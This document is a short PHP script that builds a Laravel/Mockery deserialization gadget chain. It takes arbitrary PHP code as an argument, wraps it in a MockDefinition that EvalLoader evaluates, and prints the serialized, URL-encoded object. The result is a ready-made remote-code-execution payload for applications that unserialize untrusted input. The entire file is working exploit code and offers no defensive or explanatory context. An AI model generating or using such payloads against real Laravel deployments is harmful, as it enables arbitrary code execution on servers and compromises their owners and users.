<?php
/*
Author:monitor
description:
    laravel deserialization chain
*/
namespace Illuminate\Broadcasting
{
    class PendingBroadcast{
        protected $events;
        protected $event;
        public function __construct($events,$event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Bus
{
    class Dispatcher{
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace Mockery\Loader
{
    class EvalLoader{

    }
}

namespace Mockery\Generator
{
    class MockDefinition{
        protected $config;
        protected $code;
        public function __construct($config,$code){
            $this->config = $config;
            $this->code = $code;
        }
    }
    class MockConfiguration{
        protected $name;
        public function __construct($name)
        {
            $this->name = $name;
        }
    }
}

namespace Illuminate\Queue
{
    class CallQueuedClosure{
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}

namespace
{   
    if($argc<2){
        echo "Description:\n\tUse laravel deserialization to eval php code,don't need to input php tags.";
        echo "\nUsage:" .$argv[0] . " <code>";
        exit();
    }
    $code = $argv[1];
    $mockconfiguration = new Mockery\Generator\MockConfiguration("pass");
    $mockdefination = new Mockery\Generator\MockDefinition($mockconfiguration,"<?php ".$code." exit;?>");
    $callqueuedclosure = new Illuminate\Queue\CallQueuedClosure($mockdefination);
    $evaload = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evaload,"load"));
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$callqueuedclosure);
    echo urlencode(serialize($pendingbroadcast));
}